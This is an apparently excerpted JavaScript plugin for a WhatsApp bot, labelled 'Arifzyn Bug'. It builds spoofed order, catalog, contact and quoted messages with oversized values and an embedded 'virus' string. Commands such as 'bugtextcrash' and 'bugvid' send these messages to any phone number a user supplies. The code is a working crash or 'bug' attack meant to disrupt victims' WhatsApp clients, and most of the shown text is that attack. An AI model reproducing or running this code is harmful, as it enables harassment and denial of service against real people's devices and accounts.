...
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
	...
	let q = `Bug Tag From Arifzyn\n${text}`
	let sections = [{
		title: `Recoded by Arifzyn`,
		rows: [
	...
	"message": {
		orderMessage: { 		itemCount: 100000000000,
			status: 200, 		thumbnail: thumb, 		surface: 200, 		message: `© Arifzyn Bug`,
			token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			totalAmount1000: "500000000000000",
			totalCurrencyCode: "IDR",
			orderTitle: `Arifzyn Bug ${virus2}`,
	...
	message: {
		"imageMessage": { "mimetype": "image/jpeg", "caption": 'Arifzyn Bug', "jpegThumbnail": thumb
		}
	}}
	//=================================================//   
	//# Vn
	...
	const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
		...
		"product": {
			...
			"currencyCode": "IDR",
			"bodyText": `${virus}`,
			"footerText": 'Arifzyn Bug',
			"priceAmount1000": "10000000",
			"productImageCount": 1,
			"firstImageId": 1,
			"salePriceAmount1000": "10000000",
			"retailerId": 'Arifzyn Bug',
	...
	//=================================================//	
	//# Contact
	const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": Arifzyn Bug${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:ArifzynBug\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
	//=================================================//   
	//# Text
	const main = {
		"key": {
	...
	switch (type) {
		...
		break*/
		case 'reactpc': {
			await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `Arifzyn Bug` }, {quoted: trol})
		...
		break
		case 'bugtextcrash': {
			conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `Arifzyn`, main)
		}
		break
		case 'bugvid': {
